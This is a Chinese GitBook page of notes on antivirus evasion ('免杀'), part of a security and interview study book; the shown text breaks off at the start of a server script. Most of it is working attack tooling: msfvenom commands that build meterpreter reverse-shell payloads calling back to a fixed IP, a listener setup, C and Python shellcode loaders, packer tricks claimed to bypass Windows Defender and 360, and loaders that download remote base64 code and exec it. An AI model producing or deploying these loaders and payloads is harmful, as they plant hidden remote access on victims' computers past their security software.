
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>免杀 · GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="antikillinter.html" />
    
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    前言
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../tips.html">
            
                <a href="../tips.html">
            
                    
                    tips
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../language/python.html">
            
                <a href="../language/python.html">
            
                    
                    python
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" data-path="../interview/python.html">
            
                <a href="../interview/python.html">
            
                    
                    python后端开发面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.2" data-path="../language/python_secure.html">
            
                <a href="../language/python_secure.html">
            
                    
                    python安全
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.2.1" data-path="../interview/python_secure.html">
            
                <a href="../interview/python_secure.html">
            
                    
                    python安全面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.3" data-path="../language/java.html">
            
                <a href="../language/java.html">
            
                    
                    java
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.3.1" data-path="../language/javagui.html">
            
                <a href="../language/javagui.html">
            
                    
                    java swing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.2" data-path="../language/javafx.html">
            
                <a href="../language/javafx.html">
            
                    
                    javafx
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.3" data-path="../interview/java.html">
            
                <a href="../interview/java.html">
            
                    
                    JAVA后端开发面试题
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.4" data-path="../language/s2.html">
            
                <a href="../language/s2.html">
            
                    
                    s2
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.4" data-path="../language/golang.html">
            
                <a href="../language/golang.html">
            
                    
                    golang
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.4.1" data-path="../interview/golang.html">
            
                <a href="../interview/golang.html">
            
                    
                    golang后端开发面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.5" data-path="../thinkphp/thinkphp6.html">
            
                <a href="../thinkphp/thinkphp6.html">
            
                    
                    thinkphp
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.5.1" data-path="../thinkphp/thinkphp面试题.html">
            
                <a href="../thinkphp/thinkphp面试题.html">
            
                    
                    thinkphp框架面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.6" data-path="../thinkphp/yii2.html">
            
                <a href="../thinkphp/yii2.html">
            
                    
                    yii2
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.7" data-path="../c#/c">
            
                <span>
            
                    
                    c#
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.7.1" data-path="../.net/.net面试题.html">
            
                <a href="../.net/.net面试题.html">
            
                    
                    .NET面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.8" data-path="../language/c++.html">
            
                <a href="../language/c++.html">
            
                    
                    c++
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.8.1" data-path="../language/c++面试题.html">
            
                <a href="../language/c++面试题.html">
            
                    
                    c++面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.9" data-path="../android/base.html">
            
                <a href="../android/base.html">
            
                    
                    安卓开发
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="../language/algorithm.html">
            
                <a href="../language/algorithm.html">
            
                    
                    算法基础
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="4.1" data-path="../web/sql injection.html">
            
                <a href="../web/sql injection.html">
            
                    
                    sql注入
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2" data-path="../web/xss.html">
            
                <a href="../web/xss.html">
            
                    
                    XSS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3" data-path="../web/xxe.html">
            
                <a href="../web/xxe.html">
            
                    
                    XXE
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="5.1" data-path="privilege.html">
            
                <a href="privilege.html">
            
                    
                    权限提升
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2" data-path="information.html">
            
                <a href="information.html">
            
                    
                    横向移动，代理隧道
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.3" >
            
                <span>
            
                    
                    [权限维持]
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.3.1" data-path="../thinkphp/pentest.html">
            
                <a href="../thinkphp/pentest.html">
            
                    
                    渗透面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="6.1" data-path="../reverse/pe.html">
            
                <a href="../reverse/pe.html">
            
                    
                    PE文件结构
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.2" data-path="../base/huibian2.html">
            
                <a href="../base/huibian2.html">
            
                    
                    汇编
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3" data-path="../reverse/win32.html">
            
                <a href="../reverse/win32.html">
            
                    
                    win32
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.4" data-path="../reverse/mfc.html">
            
                <a href="../reverse/mfc.html">
            
                    
                    MFC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.5" data-path="../reverse/保护模式.html">
            
                <a href="../reverse/保护模式.html">
            
                    
                    保护模式
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.5.1" >
            
                <span>
            
                    
                    逆向基础面试题
            
                </span>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter active" data-level="7.1" data-path="antikill.html">
            
                <a href="antikill.html">
            
                    
                    免杀
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.2" data-path="antikillinter.html">
            
                <a href="antikillinter.html">
            
                    
                    反病毒/免杀面试题
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >免杀</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <p><img src="https://s3.bmp.ovh/imgs/2023/05/11/44ddfef1c068c942.png" alt=""></p>
<h4 id="&#x9759;&#x6001;&#x514D;&#x6740;-&#x4E8C;&#x8FDB;&#x5236;&#x514D;&#x6740;">&#x9759;&#x6001;&#x514D;&#x6740;-&#x4E8C;&#x8FDB;&#x5236;&#x514D;&#x6740;</h4>
<h3 id="cc">C/C++</h3>
<p>msf&#x548C;cs&#x7684;payload&#x751F;&#x6210;</p>
<p>msf</p>
<pre><code>//&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x662F;10001&#xFF0C;&#x683C;&#x5F0F;&#x662F;c&#x7684;tcp&#x53CD;&#x5F39;shell&#x6728;&#x9A6C;
msfvenom -p windows/x64/meterpreter/reverse_tcp lport=10001 lhost=129.226.92.29 -f c -o 64-1.c
</code></pre><p><a href="https://imgse.com/i/pphR0v8" target="_blank"><img src="https://s1.ax1x.com/2023/04/03/pphR0v8.png" alt="pphR0v8.png"></a></p>
<pre><code>//&#x5F00;&#x542F;
msfconsole

// &#x751F;&#x6210;&#x53CD;&#x5F39;shell&#x6728;&#x9A6C;x64
msfvenom -p windows/x64/meterpreter/reverse_tcp lport=10001 lhost=129.226.92.29 -f c -o 64-1.c
// &#x751F;&#x6210;&#x53CD;&#x5F39;shell&#x6728;&#x9A6C;x32
msfvenom -p windows/x32/meterpreter/reverse_tcp lport=10001 lhost=129.226.92.29 -f c -o 32-3.c



//&#x5F00;&#x542F;&#x76D1;&#x542C;
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
// set payload windows/meterpreter/reverse_tcp  32&#x4F4D;
set lhost 129.226.92.29
set lport 10001
exploit
</code></pre><p>&#x5E38;&#x89C1;&#x52A0;&#x8F7D;&#x4EE3;&#x7801;</p>
<pre><code class="lang-c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="hljs-comment">//windows&#x63A7;&#x5236;&#x53F0;&#x7A0B;&#x5E8F;&#x4E0D;&#x51FA;&#x9ED1;&#x7A97;&#x53E3;</span></span>

<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] =
<span class="hljs-string">&quot;&quot;</span>;


<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>

</span>{

    <span class="hljs-comment">//((void(WINAPI*)(void))&amp;buf)();</span>

    <span class="hljs-comment">//char* Memory;</span>
    <span class="hljs-comment">//Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span>
    <span class="hljs-comment">//memcpy(Memory, buf, sizeof(buf));</span>
    <span class="hljs-comment">//((void(*)())Memory)();</span>

    __asm {
        lea eax, buf
        call eax
    }

    <span class="hljs-comment">//__asm{</span>
    <span class="hljs-comment">//mov eax, offset shellcode</span>
    <span class="hljs-comment">//_emit 0xFF</span>
    <span class="hljs-comment">//_emit 0xE0</span>
    <span class="hljs-comment">//}</span>

}
</code></pre>
<p>&#x53EF;&#x4EE5;&#x5BF9;shellcode&#x6216;&#x8005;&#x4EE3;&#x7801;&#x52A0;&#x8F7D;&#x8FDB;&#x884C;&#x5904;&#x7406;</p>
<p>&#x8FD9;&#x91CC;&#x9488;&#x5BF9;shellcode&#x6DF7;&#x6DC6;&#x52A0;&#x5BC6;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>&#x5BF9;shell.bin&#x8FDB;&#x884C;&#x6DF7;&#x6DC6;
xor aes rsa bc4 hex
</code></pre><h3 id="python">python</h3>
<p>&#x4F46;&#x662F;&#x53EF;&#x80FD;&#x5728;&#x522B;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x56E0;&#x4E3A;&#x6CA1;&#x7528;&#x7F16;&#x8BD1;&#x73AF;&#x5883;&#x65E0;&#x6CD5;&#x8FD0;&#x884C;&#xFF0C;&#x6216;&#x8005;python&#x7248;&#x672C;&#x4E0D;&#x4E00;&#x6837;</p>
<pre><code>shellcode &#x6267;&#x884C;&#x4EE3;&#x7801; &#x6253;&#x5305;&#x5668;

&#x4F7F;&#x7528;cs&#x7684;&#x52A0;&#x8F7D;&#x4E0A;&#x7EBF;
</code></pre><pre><code class="lang-python"><span class="hljs-keyword">import</span> ctypes

<span class="hljs-comment"># 64&#x4F4D;</span>
shellcode = <span class="hljs-string">b&quot;&quot;</span>


ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="hljs-number">0</span>, len(shellcode), <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x40</span>)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, ctypes.c_uint64(rwxpage), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
ctypes.windll.kernel32.WaitForSingleObject(handle, <span class="hljs-number">-1</span>)
</code></pre>
<p><a href="https://imgse.com/i/pp4YQfA" target="_blank"><img src="https://s1.ax1x.com/2023/04/04/pp4YQfA.png" alt="pp4YQfA.png"></a></p>
<pre><code>shellcode&#x52A0;&#x5BC6;&#x5668;&#x548C;&#x89E3;&#x5BC6;&#x5668;
xor aes rsa bc4 hex &#x7B49;
</code></pre><h4 id="&#x6253;&#x5305;&#x5668;">&#x6253;&#x5305;&#x5668;</h4>
<h5 id="pyinstaller">pyinstaller</h5>
<pre><code class="lang-python"><span class="hljs-comment"># Pyinstaller</span>
pip3 install pyinstaller
pyinstaller -D -w &#x6E90;&#x7A0B;&#x5E8F;.py

pyinstaller.exe -F file_1.py
</code></pre>
<h5 id="py2exe">py2exe</h5>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> distutils.core <span class="hljs-keyword">import</span> setup
<span class="hljs-keyword">import</span> py2exe

INCLUDES = [<span class="hljs-string">&apos;108-pickle-release&apos;</span>]

options = {
    <span class="hljs-string">&quot;py2exe&quot;</span>:
        {
            <span class="hljs-string">&quot;compressed&quot;</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment"># 0&#x6216;1,1&#x538B;&#x7F29;&#xFF0C;0&#x4E0D;&#x538B;&#x7F29;</span>
            <span class="hljs-string">&quot;optimize&quot;</span>: <span class="hljs-number">2</span>,  <span class="hljs-comment"># 0&#x3001;1&#x3001;2&#xFF0C;&#x6587;&#x4EF6;&#x7684;&#x4F18;&#x5316;&#x7EA7;&#x522B;</span>
            <span class="hljs-string">&quot;bundle_files&quot;</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment"># 1&#x3001;2&#x3001;3,1&#x8868;&#x793A;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x6253;&#x5305;&#x6210;&#x4E00;&#x4E2A;exe&#x6587;&#x4EF6;&#xFF0C;2&#x8868;&#x793A;&#x9664;&#x4E86;Python&#x7684;&#x89E3;&#x91CA;&#x5668;&#x5916;&#x90FD;&#x7ED1;&#x5B9A;&#xFF0C;3&#x8868;&#x793A;&#x4E0D;&#x7ED1;&#x5B9A;</span>
            <span class="hljs-string">&quot;includes&quot;</span>: INCLUDES,  <span class="hljs-comment"># &#x5217;&#x8868;&#xFF0C;&#x5305;&#x542B;&#x5176;&#x5B83;&#x7684;&#x4E00;&#x4E9B;&#x6A21;&#x5757;</span>
            <span class="hljs-string">&quot;dll_excludes&quot;</span>: [<span class="hljs-string">&apos;MSVCP90.dll&apos;</span>]  <span class="hljs-comment"># &#x5217;&#x8868;&#xFF0C;&#x5305;&#x542B;&#x7684;dll&#x6587;&#x4EF6;&#x4E0D;&#x4F1A;&#x6253;&#x5305;&#x8FDB;exe&#x7A0B;&#x5E8F;</span>
        }
}
setup(
    version=<span class="hljs-string">&apos;1.0.0&apos;</span>,
    options=options,
    description=<span class="hljs-string">&quot;this is a xiaodi test&quot;</span>,
    zipfile=<span class="hljs-keyword">None</span>,  <span class="hljs-comment"># &#x516C;&#x7528;&#x6587;&#x4EF6;&#x7684;&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;&#x201C;library.zip&#x201D;&#xFF1B;&#x5982;&#x679C;&#x6CA1;&#x6709;&#xFF0C;&#x5219;&#x4F1A;&#x5C06;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x653E;&#x5728;&#x6700;&#x7EC8;&#x7684;exe&#x6587;&#x4EF6;&#x4E2D;</span>
    console=[{<span class="hljs-string">&quot;script&quot;</span>: <span class="hljs-string">&apos;108-pickle-release.py&apos;</span>}]  <span class="hljs-comment"># &#x751F;&#x6210;&#x4E00;&#x4E2A;&#x63A7;&#x5236;&#x53F0;&#x5F62;&#x5F0F;&#x7684;exe&#x7A0B;&#x5E8F;&#xFF0C;&#x5BF9;&#x5E94;&#x7684;&#x6709;windows=[]&#xFF0C;&#x751F;&#x6210;GUI&#x5F62;&#x5F0F;&#x7684;exe&#x7A0B;&#x5E8F;</span>
)
</code></pre>
<pre><code>pip3 install py2exe
python setup.py py2exe
</code></pre><h5 id="nuitka&#x514D;&#x6740;&#x6548;&#x679C;&#x6700;&#x597D;">Nuitka(&#x514D;&#x6740;&#x6548;&#x679C;&#x6700;&#x597D;)</h5>
<pre><code>pip3 install Nuitka
nuitka  32-python.py

nuitka --mingw64 --standalone --show-progress --show-memory --enable-plugin=pyqt5 --follow-import-to=need --output-dir=out 32-python.py

nuitka --mingw64 --standalone --show-progress --show-memory --enable-plugin=pyqt5 --output-dir=out 32-python.py
</code></pre><pre><code>aes + pyinstaller &#x8FC7; wd(vt&#x5F88;&#x9AD8;)
&#x53CD;&#x5E8F;&#x5217;&#x5316; + pyinstaller &#x8FC7; 360(vt&#x5F88;&#x9AD8;)
</code></pre><h3 id="powershell">powershell</h3>
<pre><code>.ps1
&#x547D;&#x4EE4;&#x884C;
</code></pre><h5 id="&#x5206;&#x79BB;&#x514D;&#x6740;&#x65E0;&#x6587;&#x4EF6;&#x843D;&#x5730;">&#x5206;&#x79BB;&#x514D;&#x6740;/&#x65E0;&#x6587;&#x4EF6;&#x843D;&#x5730;</h5>
<pre><code>xxx.xxx/123.text
</code></pre><pre><code>1)http&#x8BF7;&#x6C42;&#x83B7;&#x53D6;
2)&#x53C2;&#x6570;&#x83B7;&#x53D6;
3)&#x8D44;&#x6E90;&#x83B7;&#x53D6;
</code></pre><h3 id="c">C</h3>
<p>..</p>
<h3 id="golang">golang</h3>
<pre><code class="lang-go"><span class="hljs-comment">//&#x7F16;&#x8BD1;&#x751F;&#x6210;exe</span>
<span class="hljs-keyword">go</span> build -o add.exe <span class="hljs-number">1.</span><span class="hljs-keyword">go</span>
</code></pre>
<pre><code>// &#x5C06; c &#x4EE3;&#x7801; &#x7684;\&#x6539;&#x6210;,0
shellcode_buf = []byte{
        0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30,
    }
</code></pre><pre><code>//&#x540C;&#x65F6;&#x8FC7;360&#x548C;&#x706B;&#x7ED2;  3.1.exe
D:\goland\file\file1\src\lighting.cn
go run 3.go shellcode
go build xxx.go key aes
</code></pre><p><a href="https://imgse.com/i/pp4Li4K" target="_blank"><img src="https://s1.ax1x.com/2023/04/04/pp4Li4K.png" alt="pp4Li4K.png"></a></p>
<h3 id="asm">ASM</h3>
<p>&#x514D;&#x6740;&#x6548;&#x679C;&#x5F88;&#x597D;</p>
<p><a href="https://forum.butian.net/share/1536" target="_blank">https://forum.butian.net/share/1536</a></p>
<h3 id="java">JAVA</h3>
<pre><code>//msf&#x751F;&#x6210;jar&#x5305;
msfvenom -p java/meterpreter/reverse_tcp lhost=3D129.226.92.29 lport=9999  -f jar -o msf.jar
</code></pre><p><a href="https://imgse.com/i/pp4vJJ0" target="_blank"><img src="https://s1.ax1x.com/2023/04/04/pp4vJJ0.png" alt="pp4vJJ0.png"></a></p>
<pre><code>//&#x6253;&#x5305;&#x6210;&#x5B57;&#x8282;&#x7801;
javac main.java
//&#x7F16;&#x8BD1;
jar -jar cvfm xxx.jar META-INF/MANIFEST.MF
</code></pre><p><a href="https://www.jb51.net/article/236000.htm" target="_blank">https://www.jb51.net/article/236000.htm</a></p>
<pre><code>1)&#x6709;java&#x73AF;&#x5883;&#xFF0C;&#x8FD0;&#x884C;jar -starw xxx.jar

2)&#x65E0;java&#x73AF;&#x5883;&#xFF0C;&#x7F16;&#x8BD1;&#x6210;exe
</code></pre><h3 id="&#x65E0;&#x6587;&#x4EF6;&#x843D;&#x5730;&#x52A0;&#x8F7D;&#x5668;&#x5206;&#x79BB;&#x5185;&#x5B58;&#x514D;&#x6740;">&#x65E0;&#x6587;&#x4EF6;&#x843D;&#x5730;/&#x52A0;&#x8F7D;&#x5668;&#x5206;&#x79BB;/&#x5185;&#x5B58;&#x514D;&#x6740;</h3>
<pre><code>&#x6740;&#x8F6F;&#xFF1A;
1&#xFF09;&#x6A21;&#x62DF;&#x6267;&#x884C;
2&#xFF09;&#x53CD;&#x7F16;&#x8BD1;&#x9006;&#x5411;
</code></pre><pre><code>1)&#x4ECE;&#x6587;&#x672C;&#x4E2D;&#x52A0;&#x8F7D;shellcode
2)&#x52A0;&#x8F7D;&#x5668;&#x53C2;&#x6570;&#x63D0;&#x53D6;
3)&#x8FDC;&#x7A0B;&#x534F;&#x8BAE;&#x52A0;&#x8F7D;&#xFF0C;&#x6BD4;&#x5982;&#x8FDC;&#x7A0B;&#x52A0;&#x8F7D;http://123.com/1.txt
4)&#x5C06;shellcode&#x4ECE;&#x7BA1;&#x9053;&#x4F20;&#x8F93;
5)&#x5C06;shellcode&#x9690;&#x5199;&#x8FDB;&#x5165;&#x56FE;&#x7247;&#x5185;
</code></pre><pre><code>&#x5982;&#x679C;&#x7528;python&#x5B9E;&#x73B0;&#x8BB0;&#x5F97;python&#x7684;&#x7F16;&#x8BD1;&#x5668;&#x662F;64&#x4F4D;&#x8FD8;&#x662F;32&#x4F4D;&#x7684;&#xFF0C;&#x5BF9;&#x5E94;&#x7684;shellcode&#x4E5F;&#x5E94;&#x8BE5;&#x6539;
</code></pre><h5 id="1&#x4ECE;&#x6587;&#x672C;&#x4E2D;&#x52A0;&#x8F7D;shellcode">1)&#x4ECE;&#x6587;&#x672C;&#x4E2D;&#x52A0;&#x8F7D;shellcode</h5>
<p>&#x52A0;&#x8F7D;s.txt&#x6587;&#x4EF6;&#x4E0A;&#x7EBF;</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> ctypes
<span class="hljs-keyword">import</span> base64

<span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;s.txt&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>) <span class="hljs-keyword">as</span> f:
    s=f.read()
s=s.replace(<span class="hljs-string">&apos;zxczx&apos;</span>,<span class="hljs-string">&apos;&apos;</span>)
shellcode=base64.b64decode(s)
ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="hljs-number">0</span>, len(shellcode), <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x40</span>)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, ctypes.c_uint64(rwxpage), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
ctypes.windll.kernel32.WaitForSingleObject(handle, <span class="hljs-number">-1</span>)
</code></pre>
<p><a href="https://imgse.com/i/ppIcvnS" target="_blank"><img src="https://s1.ax1x.com/2023/04/06/ppIcvnS.png" alt="ppIcvnS.png"></a></p>
<h5 id="2&#x52A0;&#x8F7D;&#x5668;&#x53C2;&#x6570;&#x63D0;&#x53D6;">2)&#x52A0;&#x8F7D;&#x5668;&#x53C2;&#x6570;&#x63D0;&#x53D6;</h5>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> ctypes
<span class="hljs-keyword">import</span> sys,base64


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    s=sys.argv[<span class="hljs-number">1</span>]
    sc=base64.b64decode(s)
    z=sys.argv[<span class="hljs-number">2</span>]
    zx=base64.b64decode(z)
    exec(zx)
</code></pre>
<h5 id="3&#x8FDC;&#x7A0B;&#x534F;&#x8BAE;&#x52A0;&#x8F7D;">3)&#x8FDC;&#x7A0B;&#x534F;&#x8BAE;&#x52A0;&#x8F7D;</h5>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> ctypes,requests,base64

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">g</span><span class="hljs-params">()</span>:</span>
    all=requests.get(<span class="hljs-string">&apos;http://192.168.43.86/all.txt&apos;</span>).text
    <span class="hljs-keyword">return</span> all

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    all=base64.b64decode(g())
    exec(all)
</code></pre>
<p>&#x8981;&#x4E48;&#x6362;&#x6253;&#x5305;&#x5668;&#xFF0C;&#x8981;&#x4E48;&#x6362;&#x8BF7;&#x6C42;&#x5E93;</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> ctypes,requests,base64
<span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">g</span><span class="hljs-params">()</span>:</span>
    all=urlopen(<span class="hljs-string">&apos;http://192.168.43.86/all.txt&apos;</span>).read()
    <span class="hljs-keyword">return</span> all

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    all=base64.b64decode(g())
    exec(all)
</code></pre>
<h5 id="4&#x5C06;shellcode&#x4ECE;&#x7BA1;&#x9053;&#x4F20;&#x8F93;">4)&#x5C06;shellcode&#x4ECE;&#x7BA1;&#x9053;&#x4F20;&#x8F93;</h5>
<p>client</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> socket

client = socket.socket()
client.connect((<span class="hljs-string">&quot;192.168.1.107&quot;</span>, <span class="hljs-number">9999</span>))

<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
    cmd = input(<span class="hljs-string">&quot;&gt;&gt;&gt;:&quot;</span>).strip()
    <span class="hljs-keyword">if</span> len(cmd) == <span class="hljs-number">0</span>: <span class="hljs-keyword">continue</span>
    client.send(cmd.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))
    cmd_res_size = client.recv(<span class="hljs-number">1024</span>)  <span class="hljs-comment"># &#x63A5;&#x6536;&#x547D;&#x4EE4;&#x7684;&#x957F;&#x5EA6;</span>
    print(<span class="hljs-string">&quot;&#x547D;&#x4EE4;&#x7ED3;&#x679C;&#x5927;&#x5C0F;&#xFF1A;&quot;</span>, cmd_res_size.decode())
    recevied_size = <span class="hljs-number">0</span>  <span class="hljs-comment"># &#x63A5;&#x6536;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x6765;&#x6570;&#x636E;&#x7684;&#x8BA1;&#x7B97;&#x5668;</span>
    recevied_data = <span class="hljs-string">b&apos;&apos;</span>  <span class="hljs-comment"># &#x5BA2;&#x6237;&#x7AEF;&#x6BCF;&#x6B21;&#x53D1;&#x6765;&#x5185;&#x5BB9;&#x7684;&#x8BA1;&#x6570;&#x5668;</span>
    <span class="hljs-keyword">while</span> recevied_size &lt; int(cmd_res_size.decode()):  <span class="hljs-comment"># &#x5F53;&#x63A5;&#x6536;&#x7684;&#x6570;&#x636E;&#x5927;&#x5C0F; &#x5C0F;&#x4E8E; &#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x6765;&#x7684;&#x6570;&#x636E;</span>
        cmd_res = client.recv(<span class="hljs-number">1024</span>)
        recevied_size += len(cmd_res)  <span class="hljs-comment"># &#x6BCF;&#x6B21;&#x6536;&#x5230;&#x7684;&#x670D;&#x52A1;&#x7AEF;&#x7684;&#x6570;&#x636E;&#x6709;&#x53EF;&#x80FD;&#x5C0F;&#x4E8E;1024&#xFF0C;&#x6240;&#x4EE5;&#x5FC5;&#x987B;&#x7528;len&#x5224;&#x65AD;</span>
        recevied_data += cmd_res
    <span class="hljs-keyword">else</span>:
        print(recevied_data.decode(<span class="hljs-string">&quot;utf-8&quot;</span>, <span class="hljs-string">&quot;ignore&quot;</span>))
        print(<span class="hljs-string">&quot;cmd res receive done ....&quot;</span>, recevied_size)

client.close()
</code></pre>
<p>server</p>
<pre><code class="lang-python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span>
